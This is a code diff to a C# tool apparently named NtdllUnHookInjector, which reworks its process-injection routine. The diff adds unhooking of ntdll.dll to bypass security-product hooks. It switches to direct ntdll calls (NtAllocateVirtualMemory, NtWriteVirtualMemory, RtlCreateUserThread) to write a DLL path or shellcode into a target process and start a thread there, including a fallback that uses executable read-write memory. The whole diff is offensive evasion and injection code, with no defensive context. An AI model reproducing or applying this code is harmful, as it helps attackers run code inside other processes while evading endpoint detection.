@@ -4,6 +4,7 @@ using Serilog;
 using NtdllUnHookInjector.Core.Payloads;
 using static NtdllUnHookInjector.Native.NativeMethods;
 using static NtdllUnHookInjector.Native.NativeConstant;
+using static NtdllUnHookInjector.Native.Delegates;
 
 namespace NtdllUnHookInjector.Core.Services
 {
@@ -21,63 +22,67 @@ namespace NtdllUnHookInjector.Core.Services
                 return;
             }
 
-            // 2. Get the address of the LoadLibraryA function
+            // 2. Load ntdll and unhook
+            IntPtr ntdll = UnhookService.GetNtdll();
+            UnhookService.UnhookModule(ntdll, hProcess, @"C:\Windows\System32\ntdll.dll");
+
+            // 3. Get the necessary ntdll delegate
+            var NtAllocateVirtualMemory = UnhookService.LoadFunction<NtAllocateVirtualMemoryDelegate>(ntdll, "NtAllocateVirtualMemory");
+            var NtWriteVirtualMemory = UnhookService.LoadFunction<NtWriteVirtualMemoryDelegate>(ntdll, "NtWriteVirtualMemory");
+            var RtlCreateUserThread = UnhookService.LoadFunction<RtlCreateUserThreadDelegate>(ntdll, "RtlCreateUserThread");
+            var NtWaitForSingleObject = UnhookService.LoadFunction<NtWaitForSingleObjectDelegate>(ntdll, "NtWaitForSingleObject");
+            var NtClose = UnhookService.LoadFunction<NtCloseDelegate>(ntdll, "NtClose");
+
+            // 4. Get the address of the LoadLibraryA function
             IntPtr remoteFunctionAddress = payload.GetRemoteFunctionAddress();
 
-            // 3. Allocate memory in the target process to store the DLL path
+            // 5. Allocate memory in the target process to store the file path
+            IntPtr baseAddress = IntPtr.Zero;
             byte[] payloadBytes = payload.GetPayloadBytes();
-            IntPtr allocatedMemory;
+            UIntPtr regionSize = (UIntPtr)payloadBytes.Length;
+            uint status;
             if (remoteFunctionAddress == IntPtr.Zero)
             {
                 Log.Warning("Failed: Unable to get LoadLibraryW address.");
-                Log.Warning("Trying to execute VirtualAllocEx using shellcode.");
-                allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)payloadBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                Log.Warning("Trying to execute NtAllocateVirtualMemory using shellcode.");
+                status = NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+                UnhookService.CheckStatus(status, hProcess, "Failed：Unable to allocate memory in the remote process.");
             }
             else
             {
-                allocatedMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)payloadBytes.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                status = NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                UnhookService.CheckStatus(status, hProcess, "Failed：Unable to allocate memory in the remote process.");
             }
 
-            if (allocatedMemory == IntPtr.Zero)
-            {
-                Log.Error("Failed：Unable to allocate memory in the remote process.");
-                CloseHandle(hProcess);
-                return;
-            }
+            // 6. Write the file path to the target process's memory
+            status = NtWriteVirtualMemory(hProcess, baseAddress, payloadBytes, (uint)payloadBytes.Length, out IntPtr bytesWritten);
+            UnhookService.CheckStatus(status, hProcess, "Failed：Unable to write file path to remote process.");
 
-            // 4. Write the DLL path to the target process's memory
-            if (!WriteProcessMemory(hProcess, allocatedMemory, payloadBytes, (uint)payloadBytes.Length, out _))
-            {
-                Log.Error("Failed：Unable to write DLL path to remote process.");
-                CloseHandle(hProcess);
-                return;
-            }
-
-            // 5. Create a remote thread in the target process to call LoadLibraryA
+            // 7. Create a remote thread in the target process to call LoadLibraryA
             IntPtr remoteThread;
             if (remoteFunctionAddress == IntPtr.Zero)
             {
                 Log.Warning("Failed: Unable to get LoadLibraryW address.");
                 Log.Warning("Trying to execute CreateRemoteThread using shellcode.");
-                remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, out _);
+                status = RtlCreateUserThread(hProcess, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, baseAddress, IntPtr.Zero, out remoteThread, out _);
+                UnhookService.CheckStatus(status, hProcess, $"Failed：Unable to establish remote thread. Error code:{Marshal.GetLastWin32Error()}");
             }
             else
             {
-                remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteFunctionAddress, allocatedMemory, 0, out _);
-            }
-            //CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, out _);
-            if (remoteThread == IntPtr.Zero)
-            {
-                Log.Error($"Failed：Unable to establish remote thread. Error code:{Marshal.GetLastWin32Error()}");
-                CloseHandle(hProcess);
-                return;
+                status = RtlCreateUserThread(hProcess, IntPtr.Zero, false, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, remoteFunctionAddress, baseAddress, out remoteThread, out _);
+                UnhookService.CheckStatus(status, hProcess, $"Failed：Unable to establish remote thread. Error code:{Marshal.GetLastWin32Error()}");
             }
 
-            WaitForSingleObject(remoteThread, 5000);
-            // 6. Cleanup
-            CloseHandle(remoteThread);
-            CloseHandle(hProcess);
-            Log.Information("DLL injection successful!");
+            status = NtWaitForSingleObject(remoteThread, false, IntPtr.Zero);
+            UnhookService.CheckStatus(status, hProcess, "NtWaitForSingleObject");
+
+            // 8. Cleanup
+            status = NtClose(remoteThread);
+            UnhookService.CheckStatus(status, hProcess, "NtClose(remoteThread)");
+            status = NtClose(hProcess);
+            UnhookService.CheckStatus(status, hProcess, "NtClose(hProcess)");
+
+            Log.Information("Injection successful!");
         }
     }
 }
